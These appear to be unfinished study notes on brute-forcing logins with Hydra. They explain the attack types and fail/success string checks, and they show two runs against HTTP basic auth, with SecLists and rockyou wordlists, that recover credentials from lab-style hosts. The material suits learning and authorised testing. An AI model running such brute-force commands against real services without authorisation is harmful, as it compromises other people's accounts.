# <a id="top-of-page"></a> Login Brute Forcing

## Attack Tools

## General Information on Hydra

### Attack Types

| **Attack**                 | **Description**                                                                                                             |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Online Brute Force Attack  | Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP, and others                                       |
|                            |
| Offline Brute Force Attack | Also known as Offline Password Cracking, where you attempt to crack a hash of an encrypted password.                        |
|                            |
| Reverse Brute Force Attack | Also known as username brute-forcing, where you try a single common password with a list of usernames on a certain service. |
|                            |
| Hybrid Brute Force Attack  | Attacking a user by creating a customized password wordlist, built using known intelligence about the user or the service.  |
|                            |
| Dictionary Attack          | tries to guess passwords with the help of lists. The goal is to use a list of known passwords to guess an unknown password. |

### Hydra Modules

Hydra provides many different types of requests that can be used to brute force different services. The command below will generate a curates list of all supported services.

| **Command**                                                                        | **Description**                                 |
| ---------------------------------------------------------------------------------- | ----------------------------------------------- |
| `hydra -h \| grep "Supported services" \| tr ":" "\n" \| tr " " "\n" \| column -e` | Generates a list of supported services by Hydra |

### Fail/Success Strings

When running a brute-force attack against an HTTP(s) taregt, there needs to be a way for Hydra to differentiate from a successful/failed attempt. Hydra can inspect the HTML code of the response page to check for a specific string to determine success/failure.

| **Type** | **Bool Val** | **Flag**       |
| -------- | ------------ | -------------- |
| Fail     | FALSE        | F=html_content |
| Success  | TRUE         | S=html_content |

If a fail string is provided, Hydra will keep looking until the string is not found in the response. Another way is if a success string is provided, Hydra will keep looking until the string is found in the response.

The best action is to test a login attempt and see whether a string appears that tells the user that a failed login was attempt (e.g., Invalid Login Details). If that string appears it can be used as a 'Fail' type check for Hydra, but if the page does not return any response when a failed attempt is made than other methods will be needed. Another method of providing data to Hydra is to use the HTML content of the login page and find something that would be unlikely to exist anywhere other than the login HTML. An example of this would be to use the form element of the login form as a check `"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"`.

## Basic HTTP Auth Brute Forcing

## INSERT PICTURE OF BASIC AUTH FORM HERE

### Default Credentials

It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. test:test-, and scan those first. If no results are found, than usage of seperate wordlists for username & password can be tried.

Wordlists of Default Credentials can be found at [SecLists](https://github.com/danielmiessler/SecLists).

--Example (Hydra)--

```
Anon4Now@ATTACKER[/ATTACKER]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

| **Options**                        | **Description**                        |
| ---------------------------------- | -------------------------------------- |
| `-C ftp-betterdefaultpasslist.txt` | flag for Combined Credentials Wordlist |
| `SERVER_IP`                        | Target IP                              |
| `-s PORT`                          | flag for Target Port                   |
| `http-get`                         | Request Method                         |
| `/`                                | Target Path                            |

### Password and/or Username Brute Force

To brute force a username and/or password with Hydra, the use of the -L flag (usernames) and the -P flag (passwords) will be used.

--Example-- (Hydra)

```
Anon4Now@ATTACKER[/ATTACKER]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
[DATA] attacking http-get://178.35.49.134:32901/
[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active

<...SNIP...>
[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1

[STATUS] attack finished for SERVER_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

| **Options** | **Description**                                   |
| ----------- | ------------------------------------------------- |
| `-L`        | flag for the usernames wordlist                   |
| `-P`        | flag for the passwords wordlist                   |
| `-f`        | flag to stop after the first successful login     |
| `-u`        | flag, so that it tries all users on each password |
| `SERVER_IP` | Target IP                                         |
| `-s PORT`   | flag for Target Port                              |
| `http-get`  | Request Method                                    |
| `/`         | Target Path                                       |

## Web Forms Brute Forcing
